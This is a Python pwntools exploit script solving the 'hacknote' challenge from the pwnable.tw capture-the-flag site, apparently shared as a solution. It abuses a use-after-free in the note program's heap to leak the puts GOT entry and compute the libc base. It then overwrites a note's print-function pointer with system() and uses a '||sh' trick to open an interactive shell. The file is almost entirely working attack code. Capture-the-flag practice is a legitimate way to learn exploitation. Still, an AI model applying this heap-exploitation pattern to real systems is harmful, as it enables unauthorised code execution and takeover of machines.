#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import * 
from time import sleep
import pdb
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./hacknote")
    elf = ELF("./hacknote")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

else:
    io = remote("chall.pwnable.tw", 10102)
    elf = ELF("./hacknote")
    libc = ELF("./libc_32.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    cmd = '''
    b *0x804869A
    b *0x804872C
    b *0x80487D3
    b *0x8048863
    b *0x8048879
    b *0x804893D
    '''
    gdb.attach(io, cmd)

def addNote(size, content):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("size :", str(size))
    io.sendafter("Content :", content)

def delNote(idx):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("Index :", str(idx))
    

def printNote(idx):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("Index :", str(idx))

def leak():
    addNote(24, 'a' * 24)
    addNote(24, 'b' * 24)
 
    delNote(0)
    delNote(1)

    addNote(8, p32(0x804862B) + p32(elf.got["puts"]))

    printNote(0)
    libc_base = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
    info("libc_base -> 0x%x" % libc_base)
    return libc_base

def shell(libc_base):
    addNote(40, 'ccc')

    delNote(2)

    #  pdb.set_trace()
    #  DEBUG()
    # use || to execute system("sh")
    payload = p32(libc_base + libc.symbols["system"]) + "||sh"
    addNote(8, payload)

    printNote(0)

if __name__ == "__main__":
    #  DEBUG()
    shell(leak())
    io.interactive()
    io.close()
